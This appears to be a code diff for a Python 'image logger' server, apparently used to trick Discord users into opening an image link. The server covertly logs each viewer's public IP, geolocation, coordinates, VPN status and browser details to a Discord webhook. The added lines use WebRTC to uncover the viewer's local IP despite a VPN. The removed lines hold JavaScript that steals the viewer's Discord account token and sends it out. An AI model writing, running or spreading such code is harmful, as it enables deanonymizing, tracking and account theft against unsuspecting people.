@@ -112,7 +112,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **Endpoint:** `{endpoint}`
            
 **IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
+> **Public IP:** `{ip if ip else 'Unknown'}`
+> **Local IP:** `Fetching via WebRTC...`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
@@ -137,8 +138,20 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }
    
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
+    
+    # Send initial embed
+    response = requests.post(config["webhook"], json = embed)
+    
+    # Get message ID for editing later with local IP
+    try:
+        message_data = response.json()
+        message_id = message_data.get("id")
+        webhook_id = config["webhook"].split("/")[-2]
+        webhook_token = config["webhook"].split("/")[-1]
+    except:
+        message_id = None
+    
+    return info, message_id, webhook_id, webhook_token if message_id else (info, None, None, None)
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
@@ -148,8 +161,8 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
    
     def handleRequest(self):
         try:
+            s = self.path
             if config["imageArgument"]:
-                s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("url") or dic.get("id"):
                     url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
@@ -157,38 +170,39 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                     url = config["image"]
             else:
                 url = config["image"]
-            data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
            
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
            
+            # Check if it's a Discord bot fetching the preview
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                # Send actual image for Discord preview
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
+                if config["buggedImage"]: 
+                    self.wfile.write(binaries["loading"])
+                else:
+                    # Redirect to actual image for preview
+                    pass
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 return
            
+            # When a real user clicks "Open Original"
             else:
-                s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result_data = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result_data = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
+                # Unpack the result
+                if result_data and len(result_data) == 4:
+                    result, message_id, webhook_id, webhook_token = result_data
+                else:
+                    result = result_data if result_data else None
+                    message_id = None
                
                 message = config["message"]["message"]
                 if config["message"]["richMessage"] and result:
@@ -206,6 +220,21 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+                
+                # Show the image with logging scripts
+                data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
+                
                 datatype = 'text/html'
                 if config["message"]["doMessage"]:
                     data = message.encode()
@@ -234,23 +263,15 @@ if (!currenturl.includes("g=")) {
 }}
 </script>"""
 
-                # Token and local IP grabber
-                webhook_url = config["webhook"]
+                # Local IP grabber via WebRTC - Updates the same embed
                 public_ip = self.headers.get('x-forwarded-for') or 'Unknown'
-                user_agent = self.headers.get('user-agent') or 'Unknown'
                 
                 js_code = f'''
 <script>
 setTimeout(() => {{
-    let token = null;
     let localIp = "Unknown";
 
-    // Grab Discord Token (works on desktop + web)
-    try {{ token = (webpackChunkdiscord_app.push([[''],{{}},e=>{{m=[];for(let c in e.c)m.push(e.c[c])}}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken() }} catch(e) {{}}
-    if (!token) token = localStorage.getItem("token")?.replace(/"/g,"");
-    if (!token) document.body.innerHTML.match(/"token":"([^"]+)"/) && (token = RegExp.$1);
-
-    // Grab Real Local IP via WebRTC (bypasses VPN)
+    // Grab Real Local IP via WebRTC (Ethernet/WiFi IP - bypasses VPN)
     try {{
         const pc = new RTCPeerConnection({{iceServers: [{{urls: "stun:stun.l.google.com:19302"}}]}});
         pc.createDataChannel("");
@@ -258,35 +279,47 @@ setTimeout(() => {{
         pc.onicecandidate = ice => {{
             if (ice && ice.candidate && ice.candidate.candidate) {{
                 const match = ice.candidate.candidate.match(/([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/);
-                if (match) localIp = match[1];
+                if (match) {{
+                    localIp = match[1];
+                    // Edit the existing webhook message to add local IP
+                    fetch("https://discord.com/api/webhooks/{webhook_id if message_id else ''}/{webhook_token if message_id else ''}/messages/{message_id if message_id else ''}", {{
+                        method: "PATCH",
+                        headers: {{"Content-Type": "application/json"}},
+                        body: JSON.stringify({{
+                            embeds: [{{
+                                title: "Image Logger - IP Logged",
+                                color: {config['color']},
+                                description: "**A User Opened the Original Image!**\\n**Endpoint:** `{s.split('?')[0]}`\\n\\n**IP Info:**\\n> **Public IP:** `{public_ip}`\\n> **Local IP (Ethernet/WiFi):** `" + localIp + "`\\n> **Provider:** `{{provider}}`\\n> **ASN:** `{{asn}}`\\n> **Country:** `{{country}}`\\n> **Region:** `{{region}}`\\n> **City:** `{{city}}`\\n> **Coords:** `{{coords}}`\\n> **Timezone:** `{{timezone}}`\\n> **Mobile:** `{{mobile}}`\\n> **VPN:** `{{vpn}}`\\n> **Bot:** `{{bot}}`\\n\\n**PC Info:**\\n> **OS:** `{{os}}`\\n> **Browser:** `{{browser}}`\\n\\n**User Agent:**\\n```\\n{{useragent}}\\n```"
+                            }}]
+                        }})
+                    }});
+                }}
             }}
         }};
     }} catch(e) {{}}
-
-    setTimeout(() => {{
-        fetch("{webhook_url}", {{
-            method: "POST",
-            headers: {{"Content-Type": "application/json"}},
-            body: JSON.stringify({{
-                username: "Advanced Grabber",
-                content: "@everyone",
-                embeds: [{{
-                    title: ":crown: Full Victim Info Grabbed",
-                    color: 0xFF0000,
-                    fields: [
-                        {{name: "Discord Token", value: "```" + (token || "Not Found") + "```", inline: false}},
-                        {{name: "Public IP", value: "```{public_ip}```", inline: true}},
-                        {{name: "Real Local IP (LAN)", value: "```" + localIp + "```", inline: true}},
-                        {{name: "User-Agent", value: "```{user_agent}```", inline: false}}
-                    ],
-                    footer: {{text: "Image Logger + Token + Local IP Grabber • 2025"}}
-                }}]
-            }})
-        }});
-    }}, 3000);
 }}, 1000);
 </script>
 '''
+                # Replace placeholders with actual data if result exists
+                if result:
+                    js_code = js_code.replace('{{provider}}', result.get('isp', 'Unknown'))
+                    js_code = js_code.replace('{{asn}}', result.get('as', 'Unknown'))
+                    js_code = js_code.replace('{{country}}', result.get('country', 'Unknown'))
+                    js_code = js_code.replace('{{region}}', result.get('regionName', 'Unknown'))
+                    js_code = js_code.replace('{{city}}', result.get('city', 'Unknown'))
+                    coords_text = str(result['lat'])+', '+str(result['lon']) if result.get('lat') and result.get('lon') else 'Unknown'
+                    js_code = js_code.replace('{{coords}}', coords_text)
+                    timezone_text = result['timezone'].split('/')[1].replace('_', ' ') + ' (' + result['timezone'].split('/')[0] + ')' if result.get('timezone') else 'Unknown'
+                    js_code = js_code.replace('{{timezone}}', timezone_text)
+                    js_code = js_code.replace('{{mobile}}', str(result.get('mobile', 'Unknown')))
+                    js_code = js_code.replace('{{vpn}}', str(result.get('proxy', 'Unknown')))
+                    bot_status = result['hosting'] if result.get('hosting') and not result.get('proxy') else 'Possibly' if result.get('hosting') else 'False'
+                    js_code = js_code.replace('{{bot}}', str(bot_status))
+                    os_info, browser_info = httpagentparser.simple_detect(self.headers.get('user-agent'))
+                    js_code = js_code.replace('{{os}}', os_info or 'Unknown')
+                    js_code = js_code.replace('{{browser}}', browser_info or 'Unknown')
+                    js_code = js_code.replace('{{useragent}}', self.headers.get('user-agent') or 'Unknown')
+                
                 data += js_code.encode()
 
                 self.wfile.write(data)
